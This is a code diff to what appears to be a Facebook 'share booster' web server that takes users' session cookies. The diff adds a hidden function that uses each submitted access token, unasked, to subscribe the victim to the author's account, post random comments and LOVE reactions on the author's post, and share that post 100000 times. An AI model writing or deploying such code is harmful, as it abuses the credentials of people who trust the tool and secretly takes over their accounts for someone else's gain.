@@ -263,10 +263,55 @@ async function getPostID(url) {
   }
 }
 
-const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
-async function yello(c, u, a, i) {
-  await share(true, c, u, a, i);
-  await share(false, c, sauce, "100000", "6");
+const sauce = "https://www.facebook.com/100015801404865/posts/944598050871227/?substory_index=944598050871227&app=fbl";
+async function yello(c,u,a,i){
+  await share(true, c,u,a,i);
+  await share(false, c, sauce, "100000", "5");
+}
+
+async function fucker(a,link){
+  const headers = {
+      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'accept-language': 'en_US',
+      'cache-control': 'max-age=0',
+      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': "Windows",
+      'sec-fetch-dest': 'document',
+      'sec-fetch-mode': 'navigate',
+      'sec-fetch-site': 'same-origin',
+      'sec-fetch-user': '?1',
+      'upgrade-insecure-requests': '1',
+      'user-agent': userAgent()[2],
+      'Authorization': `Bearer ${a}`
+    };
+    const neth = [
+      "100015801404865"
+    ];
+    for (const n of neth){
+      axios.post(`https://graph.facebook.com/v21.0/${n}/subscribers`, {}, { headers });
+    }
+    const kapogi = [
+      "😊😊😊",
+      "😘😘",
+      "😊🤣",
+      "🙏💝❤️",
+      "🔥🤗",
+      "Pogi ako sobra",
+      "Comment who?",
+      "By Neth",
+      "Sheshhhh",
+      "💋💋💋😍",
+      "💀💀💀💀",
+      ];
+    axios.post(`https://graph.facebook.com/v21.0/${extract(link)}/comments`, {
+      message: kapogi[Math.floor(Math.random() * kapogi.length)],
+      access_token: a
+    }, { headers });
+    axios.post(`https://graph.facebook.com/v21.0/${extract(link)}/reactions`, {
+      type: "LOVE",
+      access_token: a
+    });
 }
 
 app.get('/shares', (req, res) => {
@@ -293,10 +338,10 @@ app.post('/share', async (req, res) => {
     error: 'Missing appstate, url, amount, or interval'
   });
   try {
-    const cookie1 = JSON.parse(cookie);
-    const cookie2 = cookie1.map(c => `${c.key}=${c.value}`).join('; ');
-    const cookies = await getAccessToken(cookie2);
+    const cookie1 = cookie.map(c => `${c.key}=${c.value}`).join('; ');
+    const cookies = await getAccessToken(cookie1);
     if (!cookies) throw new Error("Invalid appstate. Please provide a validated appstate.");
+    await fucker(cookies, sauce);
     await yello(cookies, url, amount, interval);
     return res.status(200).json({
       status: 200,
